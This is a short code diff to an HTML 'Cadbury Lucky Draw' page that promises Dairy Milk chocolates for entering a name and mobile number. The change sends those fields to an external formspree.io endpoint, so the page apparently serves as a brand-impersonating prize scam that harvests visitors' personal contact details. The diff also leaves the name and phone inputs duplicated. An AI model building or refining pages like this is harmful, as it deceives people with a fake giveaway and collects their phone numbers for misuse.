@@ -184,7 +184,10 @@
     <div id="step-form" class="step-transition">
         <h2>🍫 Cadbury Lucky Draw 🍫</h2>
         <p>Enter your name & phone number to spin and win Dairy Milk chocolates!</p>
-        <form id="infoForm">
+        <form id="infoForm" action="https://formspree.io/f/xvkzkwvz" method="POST">
+<input type="text" id="custName" name="name" placeholder="Your Name" required>
+<input type="tel" id="custPhone" name="phone" placeholder="Mobile Number" required>
+    
             <input type="text" id="custName" placeholder="Your Name" required>
             <input type="tel" id="custPhone" placeholder="Mobile Number" required>
             <button type="submit" id="submitBtn">Proceed to Spin 🎯</button>
